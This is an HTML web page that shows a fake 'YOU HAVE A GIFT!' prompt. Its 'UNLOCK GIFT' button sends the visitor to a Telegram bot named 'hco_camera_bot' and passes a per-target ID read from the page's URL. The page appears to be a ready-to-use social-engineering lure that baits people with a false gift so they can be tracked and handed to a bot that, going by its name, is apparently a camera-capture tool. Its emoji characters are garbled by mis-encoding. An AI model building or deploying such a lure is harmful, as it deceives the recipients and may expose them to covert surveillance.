<!DOCTYPE html>
<html>
<head>
    <title>üéÅ Gift Surprise</title>
    <style>
        body {
            background: black;
            color: white;
            text-align: center;
            font-family: Arial;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            padding: 30px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            border: 2px solid #ff0080;
        }
        .gift-icon {
            font-size: 80px;
            margin: 20px;
        }
        .btn {
            background: linear-gradient(45deg, #ff0080, #ff8c00);
            color: white;
            padding: 20px 40px;
            border: none;
            font-size: 20px;
            border-radius: 10px;
            margin: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .loading {
            display: none;
            margin: 20px;
            color: #ff0080;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-icon">üéÅ</div>
        <h1>YOU HAVE A GIFT!</h1>
        <p>Click to unlock your surprise:</p>
        
        <button class="btn" onclick="unlockGift()" id="unlockBtn">UNLOCK GIFT</button>
        
        <div class="loading" id="loading">üéÅ Loading gift...</div>
        
        <p style="color: #aaa; font-size: 14px; margin-top: 20px;">
            This will open Telegram to process your gift
        </p>
    </div>
    
    <script>
        // Get gift ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const giftId = urlParams.get('id') || 'UNKNOWN';
        
        function unlockGift() {
            // Show loading, hide button
            document.getElementById('unlockBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Open Telegram instantly with unique ID
            window.location.href = `https://t.me/hco_camera_bot?start=unlock_${giftId}`;
        }
        
        // Auto-focus button
        window.onload = function() {
            document.getElementById('unlockBtn').focus();
        };
    </script>
</body>
</html>
